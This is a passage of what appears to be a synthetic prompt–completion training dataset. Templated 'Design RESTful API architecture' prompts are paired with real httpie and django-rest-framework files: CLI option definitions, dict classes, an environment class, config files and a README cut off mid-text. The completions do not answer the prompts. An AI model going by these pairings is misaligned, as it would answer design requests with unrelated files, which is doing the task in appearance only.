dest='output_file',\n    metavar='FILE',\n    short_help='Save output to FILE instead of stdout.',\n    help=\"\"\"\n    Save output to FILE instead of stdout. If --download is also set, then only\n    the response body is saved to FILE. Other parts of the HTTP exchange are\n    printed to stderr.\n\n    \"\"\",\n)\n\noutput_options.add_argument(\n    '--download',\n    '-d',\n    action='store_true',\n    default=False,\n    short_help='Download the body to a file instead of printing it to stdout.',\n    help=\"\"\"\n    Do not print the response body to stdout. Rather, download it and store it\n    in a file. The filename is guessed unless specified with --output\n    [filename]. This action is similar to the default behaviour of wget.\n\n    \"\"\",\n)\noutput_options.add_argument(\n    '--continue',\n    '-c',\n    dest='download_resume',\n    action='store_true',\n    default=False,\n    short_help='Resume an interrupted download (--output needs to be specified).',\n    help=\"\"\"\n    Resume an interrupted download. Note that the --output option needs to be\n    specified as well.\n\n    \"\"\",\n)\noutput_options.add_argument(\n    '--quiet',\n    '-q',\n    action='count',\n    default=0,\n    short_help='Do not print to stdout or stderr, except for errors and warnings when provided once.',\n    help=\"\"\"\n    Do not print to stdout or stderr, except for errors and warnings when provided once.\n    Provide twice to suppress warnings as well.\n    stdout is still redirected if --output is specified.\n    Flag doesn't affect behaviour of download beyond not printing to terminal.\n\n    \"\"\",\n)\n\n#######################################################################\n# Sessions\n#######################################################################\n\nsession_name_validator = SessionNameValidator(\n    'Session name contains invalid characters.'\n)\n\nsessions = options.add_group('Sessions', is_mutually_exclusive=True)\n\nsessions.add_argument(\n    '--session',\n    metavar='SESSION_NAME_OR_PATH',\n    type=session_name_validator,\n    short_help='Create, or reuse and update a session.',\n    help=\"\"\"\n    Create, or reuse and update a session. Within a session, custom headers,\n    auth credential, as well as any cookies sent by the server persist between\n    requests.\n\n    Session files are stored in:\n\n        [HTTPIE_CONFIG_DIR]/<HOST>/<SESSION_NAME>.json.\n\n    See the following page to find out your default HTTPIE_CONFIG_DIR:\n\n        https://httpie.io/docs/cli/config-file-directory\n    \"\"\",\n)\nsessions.add_argument(\n    '--session-read-only',\n    metavar='SESSION_NAME_OR_PATH',\n    type=session_name_validator,\n    short_help='Create or read a session without updating it',\n    help=\"\"\"\n    Create or read a session without updating it form the request/response\n    exchange.\n\n    \"\"\",\n)\n\n\n#######################################################################\n# Authentication\n#######################################################################\n\n\ndef format_auth_help(auth_plugins_mapping, *, isolation_mode: bool = False):\n    text = \"\"\"\n    The authentication mechanism to be used. Defaults to \"{default}\".\n\n    {auth_types}\n    \"\"\"\n\n    auth_plugins = list(auth_plugins_mapping.values())\n    if isolation_mode:\n        auth_plugins = [\n            auth_plugin\n            for auth_plugin in auth_plugins\n            if issubclass(auth_plugin, BuiltinAuthPlugin)\n        ]\n        text += '\\n'\n        text += 'To see all available auth types on your system, including ones installed via plugins, run:\\n\\n'\n        text += '    $ http --auth-type'\n\n    auth_types = '\\n\\n    '.join(\n        '\"{type}\": {name}{package}{description}'.format(\n            type=plugin.auth_type,\n            name=plugin.name,\n            package=(\n                ''\n                if issubclass(plugin, BuiltinAuthPlugin)\n                else f' (provided by {plugin.package_name})'\n            ),\n            description=(\n                ''\n                if not plugin.description\n                else '\\n      '\n                     + ('\\n      '.join(textwrap.wrap(plugin.description)))\n            ),\n        )\n        for plugin in auth_plugins\n    )\n\n    return text.format(\n        default=auth_plugins[0].auth_type,\n        auth_types=auth_types,\n    )\n\n\nauthentication = options.add_group('Authentication')\n\nauthentication.add_argument(\n    '--auth',\n    '-a',\n    default=None,\n    metavar='USER[:PASS] | TOKEN',\n    short_help='Credentials for the selected (-A) authentication method.',\n    help=\"\"\"\n    For username/password based authentication mechanisms (e.g\n    basic auth or digest auth) if only the username is provided\n    (-a username), HTTPie will prompt for the password.\n\n    \"\"\",\n)\nauthentication.add_argument(\n    '--auth-type',\n    '-A',\n    action='lazy_choices',\n    default=None,\n    getter=plugin_manager.get_auth_plugin_mapping,\n    sort=True,\n    cache=False,\n    short_help='The authentication mechanism to be used.',\n    help_formatter=format_auth_help,\n)\nauthentication.add_argument(\n    '--ignore-netrc',\n    default=False,\n    action='store_true',\n    short_help='Ignore credentials from .netrc.'\n)\n\n#######################################################################\n# Network\n#######################################################################\n\nnetwork = options.add_group('Network')\n\nnetwork.add_argument(\n    '--offline',\n    default=False,\n    action='store_true',\n    short_help='Build the request and print it but don’t actually send it.'\n)\nnetwork.add_argument(\n    '--proxy',\n    default=[],\n    action='append',\n    metavar='PROTOCOL:PROXY_URL',\n    type=KeyValueArgType(SEPARATOR_PROXY),\n    short_help='String mapping of protocol to the URL of the proxy.',\n    help=\"\"\"\n    String mapping protocol to the URL of the proxy\n    (e.g. http:http://foo.bar:3128). You can specify multiple proxies with\n    different protocols. The environment variables $ALL_PROXY, $HTTP_PROXY,\n    and $HTTPS_proxy are supported as well.\n\n    \"\"\",\n)\nnetwork.add_argument(\n    '--follow',\n    '-F',\n    default=False,\n    action='store_true',\n    short_help='Follow 30x Location redirects.'\n)\n\nnetwork.add_argument(\n    '--max-redirects',\n    type=int,\n    default=30,\n    short_help='The maximum number of redirects that should be followed (with --follow).',\n    help=\"\"\"\n    By default, requests have a limit of 30 redirects (works with --follow).\n\n    \"\"\",\n)\nnetwork.add_argument(\n    '--max-headers',\n    type=int,\n    default=0,\n    short_help=(\n        'The maximum number of response headers to be read before '\n        'giving up (default 0, i.e., no limit).'\n    )\n)\n\nnetwork.add_argument(\n    '--timeout',\n    type=float,\n    default=0,\n    metavar='SECONDS',\n    short_help='The connection timeout of the request in seconds.',\n    help=\"\"\"\n    The connection timeout of the request in seconds.\n    The default value is 0, i.e., there is no timeout limit.\n    This is not a time limit on the entire response download;\n    rather, an error is reported if the server has not issued a response for\n    timeout seconds (more precisely, if no bytes have been received on\n    the underlying socket for timeout seconds).\n\n    \"\"\",\n)\nnetwork.add_argument(\n    '--check-status',\n    default=False,\n    action='store_true',\n    short_help='Exit with an error status code if the server replies with an error.',\n    help=\"\"\"\n    By default, HTTPie exits with 0 when no network or other fatal errors\n    occur. This flag instructs HTTPie to also check the HTTP status code and\n    exit with an error if the status indicates one.\n\n    When the server replies with a 4xx (Client Error) or 5xx (Server Error)\n    status code, HTTPie exits with 4 or 5 respectively. If the response is a\n    3xx (Redirect) and --follow hasn't been set, then the exit status is 3.\n    Also an error message is written to stderr if stdout is redirected.\n\n    \"\"\",\n)\nnetwork.add_argument(\n    '--path-as-is',\n    default=False,\n    action='store_true',\n    short_help='Bypass dot segment (/../ or /./) URL squashing.'\n)\nnetwork.add_argument(\n    '--chunked',\n    default=False,\n    action='store_true',\n    short_help=(\n        'Enable streaming via chunked transfer encoding. '\n        'The Transfer-Encoding header is set to chunked.'\n    )\n)\n\n#######################################################################\n# SSL\n#######################################################################\n\nssl = options.add_group('SSL')\n\nssl.add_argument(\n    '--verify',\n    default='yes',\n    short_help='If \"no\", skip SSL verification. If a file path, use it as a CA bundle.',\n    help=\"\"\"\n    Set to \"no\" (or \"false\") to skip checking the host's SSL certificate.\n    Defaults to \"yes\" (\"true\"). You can also pass the path to a CA_BUNDLE file\n    for private certs. (Or you can set the REQUESTS_CA_BUNDLE environment\n    variable instead.)\n    \"\"\",\n)\nssl.add_argument(\n    '--ssl',\n    dest='ssl_version',\n    choices=sorted(AVAILABLE_SSL_VERSION_ARG_MAPPING.keys()),\n    short_help='The desired protocol version to used.',\n    help=\"\"\"\n    The desired protocol version to use. This will default to\n    SSL v2.3 which will negotiate the highest protocol that both\n    the server and your installation of OpenSSL support. Available protocols\n    may vary depending on OpenSSL installation (only the supported ones\n    are shown here).\n\n    \"\"\",\n)\n\nCIPHERS_CURRENT_DEFAULTS = (\n    \"\"\"\n    See `http --help` for the default ciphers list on you system.\n\n    \"\"\"\n    if IS_MAN_PAGE else\n    f\"\"\"\n    By default, the following ciphers are used on your system:\n\n    {DEFAULT_SSL_CIPHERS_STRING}\n\n    \"\"\"\n)\nssl.add_argument(\n    '--ciphers',\n    short_help='A string in the OpenSSL cipher list format.',\n    help=f\"\"\"\n\n    A string in the OpenSSL cipher list format.\n\n    {CIPHERS_CURRENT_DEFAULTS}\n\n    \"\"\"\n)\nssl.add_argument(\n    '--cert',\n    default=None,\n    type=readable_file_arg,\n    short_help='Specifies a local cert to use as the client-side SSL certificate.',\n    help=\"\"\"\n    You can specify a local cert to use as client side SSL certificate.\n    This file may either contain both private key and certificate or you may\n    specify --cert-key separately.\n\n    \"\"\",\n)\nssl.add_argument(\n    '--cert-key',\n    default=None,\n    type=readable_file_arg,\n    short_help='The private key to use with SSL. Only needed if --cert is given.',\n    help=\"\"\"\n    The private key to use with SSL. Only needed if --cert is given and the\n    certificate file does not contain the private key.\n\n    \"\"\",\n)\n\nssl.add_argument(\n    '--cert-key-pass',\n    default=None,\n    type=SSLCredentials,\n    short_help='The passphrase to be used to with the given private key.',\n    help=\"\"\"\n    The passphrase to be used to with the given private key. Only needed if --cert-key\n    is given and the key file requires a passphrase.\n    If not provided, you’ll be prompted interactively.\n    \"\"\"\n)\n\n#######################################################################\n# Troubleshooting\n#######################################################################\n\ntroubleshooting = options.add_group('Troubleshooting')\ntroubleshooting.add_argument(\n    '--ignore-stdin',\n    '-I',\n    action='store_true',\n    default=False,\n    short_help='Do not attempt to read stdin'\n)\ntroubleshooting.add_argument(\n    '--help',\n    action='help',\n    default=Qualifiers.SUPPRESS,\n    short_help='Show this help message and exit.',\n)\ntroubleshooting.add_argument(\n    '--manual',\n    action='manual',\n    default=Qualifiers.SUPPRESS,\n    short_help='Show the full manual.',\n)\ntroubleshooting.add_argument(\n    '--version',\n    action='version',\n    version=__version__,\n    short_help='Show version and exit.',\n)\ntroubleshooting.add_argument(\n    '--traceback',\n    action='store_true',\n    default=False,\n    short_help='Prints the exception traceback should one occur.',\n)\ntroubleshooting.add_argument(\n    '--default-scheme',\n    default='http',\n    short_help='The default scheme to use if not specified in the URL.'\n)\ntroubleshooting.add_argument(\n    '--debug',\n    action='store_true',\n    default=False,\n    short_help='Print useful diagnostic information for bug reports.',\n    help=\"\"\"\n    Prints the exception traceback should one occur, as well as other\n    information useful for debugging HTTPie itself and for reporting bugs.\n\n    \"\"\",\n)\n\n#######################################################################\n# Finalization\n#######################################################################\n\noptions.finalize()\nparser = to_argparse(options)\n", "metadata": {"source": "github.com/httpie/cli", "file_path": "httpie/cli/definition.py", "language": "python", "complexity": "complex", "star_count": 36176, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 957}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from collections import OrderedDict\n\nfrom multidict import MultiDict, CIMultiDict\n\n\nclass BaseMultiDict(MultiDict):\n    \"\"\"\n    Base class for all MultiDicts.\n    \"\"\"\n\n\nclass HTTPHeadersDict(CIMultiDict, BaseMultiDict):\n    \"\"\"\n    Headers are case-insensitive and multiple values are supported\n    through the `add()` API.\n    \"\"\"\n\n    def add(self, key, value):\n        \"\"\"\n        Add or update a new header.\n\n        If the given `value` is `None`, then all the previous\n        values will be overwritten and the value will be set\n        to `None`.\n        \"\"\"\n        if value is None:\n            self[key] = value\n            return None\n\n        # If the previous value for the given header is `None`\n        # then discard it since we are explicitly giving a new\n        # value for it.\n        if key in self and self.getone(key) is None:\n            self.popone(key)\n\n        super().add(key, value)\n\n    def remove_item(self, key, value):\n        \"\"\"\n        Remove a (key, value) pair from the dict.\n        \"\"\"\n        existing_values = self.popall(key)\n        existing_values.remove(value)\n\n        for value in existing_values:\n            self.add(key, value)\n\n\nclass RequestJSONDataDict(OrderedDict):\n    pass\n\n\nclass MultiValueOrderedDict(OrderedDict):\n    \"\"\"Multi-value dict for URL parameters and form data.\"\"\"\n\n    def __setitem__(self, key, value):\n        \"\"\"\n        If `key` is assigned more than once, `self[key]` holds a\n        `list` of all the values.\n\n        This allows having multiple fields with the same name in form\n        data and URL params.\n\n        \"\"\"\n        assert not isinstance(value, list)\n        if key not in self:\n            super().__setitem__(key, value)\n        else:\n            if not isinstance(self[key], list):\n                super().__setitem__(key, [self[key]])\n            self[key].append(value)\n\n    def items(self):\n        for key, values in super().items():\n            if not isinstance(values, list):\n                values = [values]\n            for value in values:\n                yield key, value\n\n\nclass RequestQueryParamsDict(MultiValueOrderedDict):\n    pass\n\n\nclass RequestDataDict(MultiValueOrderedDict):\n    pass\n\n\nclass MultipartRequestDataDict(MultiValueOrderedDict):\n    pass\n\n\nclass RequestFilesDict(RequestDataDict):\n    pass\n", "metadata": {"source": "github.com/httpie/cli", "file_path": "httpie/cli/dicts.py", "language": "python", "complexity": "simple", "star_count": 36176, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 95}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import sys\nfrom ssl import SSLContext\nfrom typing import Any, Optional, Iterable\n\nfrom httpie.cookies import HTTPieCookiePolicy\nfrom http import cookiejar  # noqa\n\n\n# Request does not carry the original policy attached to the\n# cookie jar, so until it is resolved we change the global cookie\n# policy. <https://github.com/psf/requests/issues/5449>\ncookiejar.DefaultCookiePolicy = HTTPieCookiePolicy\n\nis_windows = 'win32' in str(sys.platform).lower()\nis_frozen = getattr(sys, 'frozen', False)\n\nMIN_SUPPORTED_PY_VERSION = (3, 7)\nMAX_SUPPORTED_PY_VERSION = (3, 11)\n\ntry:\n    from functools import cached_property\nexcept ImportError:\n    # Can be removed once we drop Python <3.8 support.\n    # Taken from `django.utils.functional.cached_property`.\n    class cached_property:\n        \"\"\"\n        Decorator that converts a method with a single self argument into a\n        property cached on the instance.\n\n        A cached property can be made out of an existing method:\n        (e.g. ``url = cached_property(get_absolute_url)``).\n        The optional ``name`` argument is obsolete as of Python 3.6 and will be\n        deprecated in Django 4.0 (#30127).\n        \"\"\"\n        name = None\n\n        @staticmethod\n        def func(instance):\n            raise TypeError(\n                'Cannot use cached_property instance without calling '\n                '__set_name__() on it.'\n            )\n\n        def __init__(self, func, name=None):\n            self.real_func = func\n            self.__doc__ = getattr(func, '__doc__')\n\n        def __set_name__(self, owner, name):\n            if self.name is None:\n                self.name = name\n                self.func = self.real_func\n            elif name != self.name:\n                raise TypeError(\n                    \"Cannot assign the same cached_property to two different names \"\n                    \"(%r and %r).\" % (self.name, name)\n                )\n\n        def __get__(self, instance, cls=None):\n            \"\"\"\n            Call the function and put the return value in instance.__dict__ so that\n            subsequent attribute access on the instance returns the cached value\n            instead of calling cached_property.__get__().\n            \"\"\"\n            if instance is None:\n                return self\n            res = instance.__dict__[self.name] = self.func(instance)\n            return res\n\n# importlib_metadata was a provisional module, so the APIs changed quite a few times\n# between 3.8-3.10. It was also not included in the standard library until 3.8, so\n# we install the backport for <3.8.\n\nif sys.version_info >= (3, 8):\n    import importlib.metadata as importlib_metadata\nelse:\n    import importlib_metadata\n\n\ndef find_entry_points(entry_points: Any, group: str) -> Iterable[importlib_metadata.EntryPoint]:\n    if hasattr(entry_points, \"select\"):  # Python 3.10+ / importlib_metadata >= 3.9.0\n        return entry_points.select(group=group)\n    else:\n        return set(entry_points.get(group, ()))\n\n\ndef get_dist_name(entry_point: importlib_metadata.EntryPoint) -> Optional[str]:\n    dist = getattr(entry_point, \"dist\", None)\n    if dist is not None:  # Python 3.10+\n        return dist.name\n\n    match = entry_point.pattern.match(entry_point.value)\n    if not (match and match.group('module')):\n        return None\n\n    package = match.group('module').split('.')[0]\n    try:\n        metadata = importlib_metadata.metadata(package)\n    except importlib_metadata.PackageNotFoundError:\n        return None\n    else:\n        return metadata.get('name')\n\n\ndef ensure_default_certs_loaded(ssl_context: SSLContext) -> None:\n    \"\"\"\n    Workaround for a bug in Requests 2.32.3\n\n    See <https://github.com/httpie/cli/issues/1583>\n\n    \"\"\"\n    if hasattr(ssl_context, 'load_default_certs'):\n        if not ssl_context.get_ca_certs():\n            ssl_context.load_default_certs()\n", "metadata": {"source": "github.com/httpie/cli", "file_path": "httpie/compat.py", "language": "python", "complexity": "medium", "star_count": 36176, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 114}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import argparse\nimport sys\nimport os\nimport warnings\nfrom contextlib import contextmanager\nfrom pathlib import Path\nfrom typing import Iterator, IO, Optional, TYPE_CHECKING\nfrom enum import Enum\n\n\ntry:\n    import curses\nexcept ImportError:\n    curses = None  # Compiled w/o curses\n\nfrom .compat import is_windows, cached_property\nfrom .config import DEFAULT_CONFIG_DIR, Config, ConfigFileError\nfrom .encoding import UTF8\n\nfrom .utils import repr_dict\nfrom .output.ui.palette import GenericColor\n\nif TYPE_CHECKING:\n    from rich.console import Console\n\n\nclass LogLevel(str, Enum):\n    INFO = 'info'\n    WARNING = 'warning'\n    ERROR = 'error'\n\n\nLOG_LEVEL_COLORS = {\n    LogLevel.INFO: GenericColor.PINK,\n    LogLevel.WARNING: GenericColor.ORANGE,\n    LogLevel.ERROR: GenericColor.RED,\n}\n\nLOG_LEVEL_DISPLAY_THRESHOLDS = {\n    LogLevel.INFO: 1,\n    LogLevel.WARNING: 2,\n    LogLevel.ERROR: float('inf'),  # Never hide errors.\n}\n\n\nclass Environment:\n    \"\"\"\n    Information about the execution context\n    (standard streams, config directory, etc).\n\n    By default, it represents the actual environment.\n    All of the attributes can be overwritten though, which\n    is used by the test suite to simulate various scenarios.\n\n    \"\"\"\n    args = argparse.Namespace()\n    is_windows: bool = is_windows\n    config_dir: Path = DEFAULT_CONFIG_DIR\n    stdin: Optional[IO] = sys.stdin  # `None` when closed fd (#791)\n    stdin_isatty: bool = stdin.isatty() if stdin else False\n    stdin_encoding: str = None\n    stdout: IO = sys.stdout\n    stdout_isatty: bool = stdout.isatty()\n    stdout_encoding: str = None\n    stderr: IO = sys.stderr\n    stderr_isatty: bool = stderr.isatty()\n    colors = 256\n    program_name: str = 'http'\n\n    # Whether to show progress bars / status spinners etc.\n    show_displays: bool = True\n\n    if not is_windows:\n        if curses:\n            try:\n                curses.setupterm()\n                colors = curses.tigetnum('colors')\n            except curses.error:\n                pass\n    else:\n        # noinspection PyUnresolvedReferences\n        import colorama.initialise\n        stdout = colorama.initialise.wrap_stream(\n            stdout, convert=None, strip=None,\n            autoreset=True, wrap=True\n        )\n        stderr = colorama.initialise.wrap_stream(\n            stderr, convert=None, strip=None,\n            autoreset=True, wrap=True\n        )\n        del colorama\n\n    def __init__(self, devnull=None, **kwargs):\n        \"\"\"\n        Use keyword arguments to overwrite\n        any of the class attributes for this instance.\n\n        \"\"\"\n        assert all(hasattr(type(self), attr) for attr in kwargs.keys())\n        self.__dict__.update(**kwargs)\n\n        # The original STDERR unaffected by --quiet’ing.\n        self._orig_stderr = self.stderr\n        self._devnull = devnull\n\n        # Keyword arguments > stream.encoding > default UTF-8\n        if self.stdin and self.stdin_encoding is None:\n            self.stdin_encoding = getattr(\n                self.stdin, 'encoding', None) or UTF8\n        if self.stdout_encoding is None:\n            actual_stdout = self.stdout\n            if is_windows:\n                # noinspection PyUnresolvedReferences\n                from colorama import AnsiToWin32\n                if isinstance(self.stdout, AnsiToWin32):\n                    # noinspection PyUnresolvedReferences\n                    actual_stdout = self.stdout.wrapped\n            self.stdout_encoding = getattr(\n                actual_stdout, 'encoding', None) or UTF8\n\n        self.quiet = kwargs.pop('quiet', 0)\n\n    def __str__(self):\n        defaults = dict(type(self).__dict__)\n        actual = dict(defaults)\n        actual.update(self.__dict__)\n        actual['config'] = self.config\n        return repr_dict({\n            key: value\n            for key, value in actual.items()\n            if not key.startswith('_')\n        })\n\n    def __repr__(self):\n        return f'<{type(self).__name__} {self}>'\n\n    _config: Config = None\n\n    @property\n    def config(self) -> Config:\n        config = self._config\n        if not config:\n            self._config = config = Config(directory=self.config_dir)\n            if not config.is_new():\n                try:\n                    config.load()\n                except ConfigFileError as e:\n                    self.log_error(e, level=LogLevel.WARNING)\n        return config\n\n    @property\n    def devnull(self) -> IO:\n        if self._devnull is None:\n            self._devnull = open(os.devnull, 'w+')\n        return self._devnull\n\n    @contextmanager\n    def as_silent(self) -> Iterator[None]:\n        original_stdout = self.stdout\n        original_stderr = self.stderr\n\n        try:\n            self.stdout = self.devnull\n            self.stderr = self.devnull\n            yield\n        finally:\n            self.stdout = original_stdout\n            self.stderr = original_stderr\n\n    def log_error(self, msg: str, level: LogLevel = LogLevel.ERROR) -> None:\n        if self.stdout_isatty and self.quiet >= LOG_LEVEL_DISPLAY_THRESHOLDS[level]:\n            stderr = self.stderr  # Not directly /dev/null, since stderr might be mocked\n        else:\n            stderr = self._orig_stderr\n        rich_console = self._make_rich_console(file=stderr, force_terminal=stderr.isatty())\n        rich_console.print(\n            f'\\n{self.program_name}: {level.value}: {msg}\\n\\n',\n            style=LOG_LEVEL_COLORS[level],\n            markup=False,\n            highlight=False,\n            soft_wrap=True\n        )\n\n    def apply_warnings_filter(self) -> None:\n        if self.quiet >= LOG_LEVEL_DISPLAY_THRESHOLDS[LogLevel.WARNING]:\n            warnings.simplefilter(\"ignore\")\n\n    def _make_rich_console(\n        self,\n        file: IO[str],\n        force_terminal: bool\n    ) -> 'Console':\n        from rich.console import Console\n        from httpie.output.ui.rich_palette import _make_rich_color_theme\n\n        style = getattr(self.args, 'style', None)\n        theme = _make_rich_color_theme(style)\n        # Rich infers the rest of the knowledge (e.g encoding)\n        # dynamically by looking at the file/stderr.\n        return Console(\n            file=file,\n            force_terminal=force_terminal,\n            no_color=(self.colors == 0),\n            theme=theme\n        )\n\n    # Rich recommends separating the actual console (stdout) from\n    # the error (stderr) console for better isolation between parts.\n    # https://rich.readthedocs.io/en/stable/console.html#error-console\n\n    @cached_property\n    def rich_console(self):\n        return self._make_rich_console(self.stdout, self.stdout_isatty)\n\n    @cached_property\n    def rich_error_console(self):\n        return self._make_rich_console(self.stderr, self.stderr_isatty)\n", "metadata": {"source": "github.com/httpie/cli", "file_path": "httpie/context.py", "language": "python", "complexity": "complex", "star_count": 36176, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 218}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "github: encode\ncustom: https://fund.django-rest-framework.org/topics/funding/\n", "metadata": {"source": "github.com/encode/django-rest-framework", "file_path": ".github/FUNDING.yml", "language": "yaml", "complexity": "simple", "star_count": 29336, "quality_score": 0.6000000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 3}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "repos:\n- repo: https://github.com/pre-commit/pre-commit-hooks\n  rev: v4.5.0\n  hooks:\n  - id: check-added-large-files\n  - id: check-case-conflict\n  - id: check-json\n  - id: check-merge-conflict\n  - id: check-symlinks\n  - id: check-toml\n- repo: https://github.com/pycqa/isort\n  rev: 5.13.2\n  hooks:\n  - id: isort\n- repo: https://github.com/PyCQA/flake8\n  rev: 7.0.0\n  hooks:\n  - id: flake8\n    additional_dependencies:\n    - flake8-tidy-imports\n- repo: https://github.com/adamchainz/blacken-docs\n  rev: 1.16.0\n  hooks:\n  - id: blacken-docs\n    exclude: ^(?!docs).*$\n    additional_dependencies:\n    - black==23.1.0\n- repo: https://github.com/codespell-project/codespell\n  # Configuration for codespell is in .codespellrc\n  rev: v2.2.6\n  hooks:\n  - id: codespell\n    exclude: locale|kickstarter-announcement.md|coreapi-0.1.1.js\n\n- repo: https://github.com/asottile/pyupgrade\n  rev: v3.19.1\n  hooks:\n  - id: pyupgrade\n    args: [\"--py39-plus\", \"--keep-percent-format\"]\n", "metadata": {"source": "github.com/encode/django-rest-framework", "file_path": ".pre-commit-config.yaml", "language": "yaml", "complexity": "simple", "star_count": 29336, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 40}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Contributing to REST framework\n\nAt this point in its lifespan we consider Django REST framework to be essentially feature-complete. We may accept pull requests that track the continued development of Django versions, but would prefer not to accept new features or code formatting changes.\n\nThe [Contributing guide in the documentation](https://www.django-rest-framework.org/community/contributing/) gives some more information on our process and code of conduct.\n", "metadata": {"source": "github.com/encode/django-rest-framework", "file_path": "CONTRIBUTING.md", "language": "markdown", "complexity": "simple", "star_count": 29336, "quality_score": 0.6000000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 6}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "*Note*: Before submitting a code change, please review our [contributing guidelines](https://www.django-rest-framework.org/community/contributing/#pull-requests).\n\n## Description\n\nPlease describe your pull request. If it fixes a bug or resolves a feature request, be sure to link to that issue. When linking to an issue, please use `refs #...` in the description of the pull request.\n", "metadata": {"source": "github.com/encode/django-rest-framework", "file_path": "PULL_REQUEST_TEMPLATE.md", "language": "markdown", "complexity": "simple", "star_count": 29336, "quality_score": 0.6000000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 6}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# [Django REST framework][docs]\n\n[![build-status-image]][build-status]\n[![coverage-status-image]][codecov]\n[![pypi-version]][pypi]\n\n**Awesome web-browsable Web APIs.**\n\nFull documentation for the project is available at [https://www.django-rest-framework.org/][docs].\n\n---\n\n# Funding\n\nREST framework is a *collaboratively funded project*. If you use\nREST framework commercially we strongly encourage you to invest in its\ncontinued development by [signing up for a paid plan][funding].\n\nThe initial aim is to provide a single full-time position on REST framework.\n*Every single sign-up makes a significant impact towards making that possible.*\n\n[![][sentry-img]][sentry-url]\n[![][stream-img]][stream-url]\n[![][spacinov-img]][spacinov-url]\n[![][retool-img]][retool-url]\n[![][bitio-img]][bitio-url]\n[![][posthog-img]][posthog-url]\n[![][cryptapi-img]][cryptapi-url]\n[![][fezto-img]][fezto-url]\n[![][svix-img]][svix-url]\n[![][zuplo-img]][zuplo-url]\n\nMany thanks to all our [wonderful sponsors][sponsors], and in particular to our premium backers, [Sentry][sentry-url], [Stream][stream-url], [Spacinov][spacinov-url], [Retool][retool-url], [bit.io][bitio-url], [PostHog][posthog-url], [CryptAPI][cryptapi-url], [FEZTO][fezto-url], [Svix][svix-url], and [Zuplo][zuplo-url].\n\n---\n\n# Overview\n\nDjango REST framework is a powerful and flexible toolkit for building Web APIs.\n\nSome reasons you might want to use REST framework:\n\n* The Web browsable API is a huge usability win for your developers.\n* [Authentication policies][authentication] including optional packages 